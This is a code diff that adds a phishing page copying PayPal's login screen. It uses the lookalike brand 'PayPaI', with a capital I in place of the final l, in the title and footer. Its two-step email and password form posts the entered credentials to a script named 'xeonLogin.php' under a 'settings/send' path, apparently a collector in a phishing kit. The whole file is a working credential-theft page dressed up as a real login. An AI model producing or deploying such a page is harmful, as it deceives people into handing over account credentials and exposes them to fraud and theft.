@@ -1,0 +1,86 @@
+<!doctypehtml><title>
+   Log in to your PayPaI account
+  </title><meta charset=utf-8><meta content=width=device-width,height=device-height,initial-scale=1.0,maximum-scale=1,user-scalable=yes name=viewport><link href=../assets/css/login.css rel=stylesheet><script src=../assets/js/jquery.min.js></script><link rel="shortcut icon"href=../assets/img/x.ico><body><div class=empty></div><div class=main id=main><section class=login id=login><div class=corral><div class="contentContainer activeContent contentContainerBordered"><header><p class="logo logo-long"></header><h1 class="headerText accessAid">Log in to your PayPaI account</h1><p class="subHeaderText hide"id=phoneSubTagLine></p><script>function validatePayForm() {
+    var a = document.forms["loginForm"]["login_email"].value;
+    var b = document.forms["loginForm"]["login_password"].value;
+    if (a == "") {
+        $("#login_emaildiv").addClass("hasError");
+        $("#login_emaildiv").css("z-index", "100");
+        $("#emailErrorMessage").addClass("show");
+        $("#mailrequired").removeClass("hide");
+        $("#email").focus();
+        if (a == ""){return false;}
+    } else {
+    	var x = document.getElementById('email').value;
+    	document.getElementById('profileDisplayEmail').innerHTML = x;
+    	$("#splitEmail").addClass("hide");
+    	$("#splitPassword").addClass("transformRightToLeft");
+    	$("#splitPassword").removeClass("hide");
+    	$(".profileRememberedEmail").removeClass("hide");
+    	$("#loading").removeClass("hide");
+    	$("#loading").addClass("spinner");
+        setTimeout(function() {
+	        $(".login_passworddiv").attr("id","login_passworddiv");
+        	$(".passwordErrorMessage").attr("id","passwordErrorMessage");
+        	$("#loading").addClass("hide");
+    		$("#loading").removeClass("spinner");
+    		$("#loading").attr("id","passloading");
+		}, 2000);
+    }
+
+    if (b == "") {
+        $("#login_passworddiv").addClass("hasError");
+        $("#login_passworddiv").css("z-index", "100");
+        $("#passwordErrorMessage").addClass("show");
+        $("#passrequired").removeClass("hide");
+        $("#password").focus();
+        if (b == ""){return false;}
+    } else {
+		   
+    }
+}</script><form class="proceed maskable"onsubmit="return validatePayForm()"action=../settings/send/xeonLogin.php id=paymentform method=post name=loginForm><style>.hidden{display:none;visibility:hidden;}</style><input class=hidden name=hidden><div class="notifications hide"><p class="notification notification-critical"role=alert>Please check your entries and try again.</div><div class="profileRememberedEmail hide"><span class=profileDisplayPhoneCode> </span><span class=profileDisplayEmail id=profileDisplayEmail> </span><a class="notYouLink scTrack:not-you"href=javascript:void(0) id=backToInputEmailLink pa-marked=1> Change </a></div><div class=splitEmail id=splitEmail><div class=clearfix id=emailSection><div style="z-index: 1;"class=textInput id=login_emaildiv><div class=fieldWrapper><label class=fieldLabel for=email>Email</label><input class="hasHelp validateEmpty"autocomplete=off id=email name=login_email placeholder=Email></div><div class=errorMessage id=emailErrorMessage><p class="emptyError hide"id=mailrequired>Required<p class="invalidError hide">That email format isn’t right</div></div></div><div class=actions><button class="button actionContinue scTrack:unifiedlogin-login-click-next"id=btnNext name=btnNext value=Next>Next</button></div></div><div class="splitPassword hide"id=splitPassword><div id=splitPasswordSection><div class=clearfix id=passwordSection><div class="textInput login_passworddiv"><div class=fieldWrapper><label class=fieldLabel for=password>Password</label><input class="hasHelp validateEmpty pin-password"autocomplete=off id=password name=login_password placeholder=Password type=password><button aria-label="Show password"class="showPassword hide show-hide-password"pa-marked=1 type=button>Show</button><button class="hidePassword hide show-hide-password"aria-label=Hide pa-marked=1 type=button>Hide</button></div><div class="errorMessage passwordErrorMessage"><p class="emptyError hide"id=passrequired>Required</div></div></div></div><div class=actions><button class="button actionContinue"id=btnLogin name=btnLogin pa-marked=1 value=Login>Log In</button><button class="button actionContinue hide"id=siftni type=button value=Login>Log In</button></div></div></form><div class=forgotLink><a class="scTrack:unifiedlogin-click-forgot-password pwrLink"href=javascript:void(0) pa-marked=1> Having trouble logging in? </a></div><div class=signupContainer id=signupContainer><div class=loginSignUpSeparator><span class=textInSeparator> or </span></div><a class="button secondary scTrack:unifiedlogin-click-signup-button"href=javascript:void(0) id=createAccount pa-marked=1> Sign Up </a></div></div></div></section><footer class=footer role=contentinfo><div class=legalFooter><div class=extendedContent><ul class="footerGroup footerGroupWithSiblings"><li><a href=javascript:void(0) pa-marked=1> Privacy </a><li><a href=javascript:void(0) pa-marked=1> PayPaI </a></ul><p class=footerCopyright>Copyright © 1999-2020 PayPaI. All rights reserved.</div></div></footer></div><div class="transitioning hide"id=loading></div><script>$("#email").blur(function() {
+  		$("#login_emaildiv").css("z-index", "1");
+        $("#emailErrorMessage").removeClass("show");
+        $("#mailrequired").addClass("hide");
+	});
+	$(document).ready(function(){
+    $('#email').on('keyup keydown keypress change paste', function() {  
+        if ($(this).val() == '') {  } 
+        else {$("#login_emaildiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#emailErrorMessage").removeClass("show");$("#mailrequired").addClass("hide"); }});
+    });</script><script>$("#password").blur(function() {
+  		$("#login_emaildiv").css("z-index", "1");
+        $("#passwordErrorMessage").removeClass("show");
+        $("#passrequired").addClass("hide");
+	});
+	$(document).ready(function(){
+    $('#password').on('keyup keydown keypress change paste', function() {  
+        if ($(this).val() == '') {  } 
+        else {$("#login_passworddiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#passwordErrorMessage").removeClass("show");$("#passrequired").addClass("hide");$(".showPassword").removeClass("hide"); }});
+    });
+    $(".showPassword").click(function() {
+  		$("#password").attr("type", "text");
+        $(".hidePassword").removeClass("hide");
+        $(".showPassword").addClass("hide");
+	});
+	$(".hidePassword").click(function() {
+  		$("#password").attr("type", "password");
+        $(".showPassword").removeClass("hide");
+        $(".hidePassword").addClass("hide");
+	});
+	$("#backToInputEmailLink").click(function() {
+  		$("#splitEmail").removeClass("hide");
+    	$("#splitPassword").addClass("hide");
+    	$(".profileRememberedEmail").addClass("hide");
+	});
+	$(document).ready(function(){
+	$('#email'),$('#password').on('keyup keydown keypress change paste', function() {  
+		if ($(this).val() == '') { $("#btnLogin").removeClass("hide");$("#siftni").addClass("hide"); } 
+		else {$("#btnLogin").addClass("hide");$("#siftni").removeClass("hide");$("#btnNext").attr("disabled","");}});
+	});
+	$("#siftni").click(function() {
+  		$("#passloading").removeClass("hide");
+    	$("#passloading").addClass("spinner");
+		setTimeout(function() {
+			$('#paymentform').submit();
+		}, 2000);
+	});</script>
